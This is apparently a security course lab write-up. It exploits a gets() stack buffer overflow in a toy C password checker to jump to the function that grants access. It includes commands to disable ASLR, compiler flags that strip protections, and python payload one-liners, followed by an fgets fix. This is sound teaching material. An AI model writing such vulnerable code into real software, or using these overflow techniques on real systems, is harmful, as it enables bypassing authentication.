description: Stack-based buffer overflow example to invoke a program function bypassing security checks
goal: The goal of this laboratory is to perform a buffer overflow attack by exploiting a vulnerable c program (more specifically the gets function) in order to to invoke a program function bypassing security checks and granting the access to hypothetical sensitive data.
solution:
Introduction

For a general discussion about basic stack-based buffer overflow techiques, please have a look at labs BufferOverflow_NSP1 and BufferOverflow_NSP2 . In this laboratory the goal of the attack is completely different from the previous ones, because we will not inject malicious code on the stack but we will exploit a vulnerability linked to entering the password from the keyboard, obtaining access to hypothetical sensitive information.

 

Vulnerable Code

The program vulnerable to the buffer overflow attack is the following:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void successo();

int main(int argc,char** argv){

	char password[16];
	printf("inserisci password: ");
	gets(password);
	if (strcmp(password,"networkSecurity")){
		printf("\nAccesso negato!\n");	
	}else{
		successo();	
	}
	return 0;
}


void successo(){
	printf("\nAccesso consentito\n");
	return ;
}

The above program is located in the NSP3 folder of the hacking machine. Its execution involves the password insertion from the keyboard and the following comparison with a string statically stored in the program. If the comparison is successful, the function successo() (containing the hypothetical sensitive data) is called, otherwise an error message is displayed. As you can see, the vulnerability of this program consists in the use of the gets function, which stores the password entered in the homonymous variable without any type of control on the size neither by the same function nor by the developer .

 

1. Adrress Space Layout Randomization Check

Address Space Layout Randomization (ASLR) is a cybersecurity technique involved in preventing the exploitation of memory corruption vulnerabilities. So the first thing we need to do is check for a specific value in Linux, which can be set to:

  • 0: disabled;
  • 1: conservative;
  • 2: full randomization

The check can be done using the following command:

cat /proc/sys/kernel/randomize_va_space

If the result of the command is different from 0, you need to disable the ASLR via the following command:

echo 0 > /proc/sys/kernel/randomize_va_space

To enable it again, it is possible to repeat the same command replacing the numerical value corresponding to the preferred randomization type.

 

2. Compiling and testing the program

To compile the program it's necessary to move to the NSP1 folder and then use the gcc compiler, with the following flags:

  • -fno-stack-protector: do not emit extra code to check for buffer overflows;
  • -no-pie: do not produce a Position Independent Executable (PIE);
  • -z execstack: option passed straight to the linker and marking the object code as requiring executable stack;
  • -ggdb: Produce debugging information for use by GDB.

Here is the whole command to be executed:

gcc -fno-stack-protector -no-pie -z execstack -o target password.c -ggdb

As you can see from the picture above, during compilation a warning is shown that warns the user of the unsafely of the gets() function, recommending the use of the safe function fgets().

The images below show the execution of the program with a non-offending inputs:

Instead this other with an offending input ( > 16 characters):

 

3. Program analysis with GDB

To understand the buffer size we need to analyze the program using gdb. It allows us to disassemble a specific function of the target program, giving us the assembly code. In order to run the program with gdb, we need to use the following command:

gdb ./target

So we are ready to disassemble, with intel flavor, the main() function of the program and check the buffer size that is allocated on the stack:

(gdb) set disassembly-flavor intel
(gdb) disas main

From the dump above it's possible to know the memory area allocated for the password[] variable, that is 16 bytes (0x10 in hexadecimal) above the base pointer register (rbp). You can see this, e.g., from the instruction "lea rax, [rbp-0x10]" that is used to prepare the parameters in view of the call to the gets function in the main. The space available to fill in before starting to overwrite the return address is 16 + 8 (old frame pointer) bytes, it will be filled with padding in order to replace the return address with the address of the successo() function. In this way we are able to call the function, containing any "sensitive data", bypassing the login.

 

4. Creating the attack.txt file

In this attack we use a file .txt to provide input to the target program, because it doesn't require the insertion of command line arguments, but only after running the application.

First of all let's see how to create a .txt file containing the input we want to submit to the program:

python -c 'print "prova" ' > prova.txt

At this point we are able to create the attack file containing the padding, to fill the stack, and 6 "B" to replace the return address using the following command:

python -c 'print "A"*24 + "B"*6 ' > attack.txt

In this case we execute the program in gdb with the newly created file as input...

...in order to analyze the contents of the registers.

As shown in the figure, the base pointer register (rbp) has been replaced with the hexadecimal values ​​corresponding to "A" (0x41) as expected. Furthermore, the instruction register (rip) has also been replaced with the hexadecimal values ​​corresponding to the "B" (0x42). All we have to do is replace the six "B" with the appropriate memory address of successo() function, obtained during the disassembly of the main function (point 3) and shown in the figure below.

In particular, it is necessary to write the address in the little endian format, to make it conform to the representation required by intel processors. The address will be:

\x2e\x06\x40\x00\x00\x00

Please note: the architecture we are using expands the addresses to 6 bytes. In the image there are only the 3 most significant bytes, so it is necessary to add the remaining 3 least significant bytes which will necessarily be "\ x00"

 

5. The Attack!

Thanks to the address obtained in the previous point, we can finally carry out the exploit, by running the target program in gdb with the attack file created with the following command:

python -c 'print "A"*24 + "\x2e\x06\x40\x00\x00\x00"' > attack.txt

The exploit has worked because the successo() function was executed, giving us the access and the hypothetical sensitive data. Enjoy the hack :D

 

Defend against Buffer Overflow

In this case the buffer overflow attack can be avoided by replacing the gets function with fgets. Unlike gets, it provides two additional parameters that one defines how many characters to copy into the destination string and the other specifies where to read the input from, in order to avoid buffer overflow.
In the NSP3 folder there is a "strcatSmallSafe" file containing the following code:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void successo();

int main(int argc,char** argv){

    char password[16];
    printf("inserisci password: ");
    fgets(password,15,stdin);
    if (strcmp(password,"networkSecurity")){
        printf("\nAccesso negato!\n");    
    }else{
        successo();    
    }
    return 0;
}


void successo(){
    printf("\nAccesso consentito\n");
    return ;
}

Let's compile it using the command already seen in the point 2:

gcc -fno-stack-protector -no-pie -z execstack -o safe passwordSafe.c -ggdb

At this point we can run it with either a valid...

... or an invalid input.

Neither of the two inputs show segmentation faults errors.
author: danilo
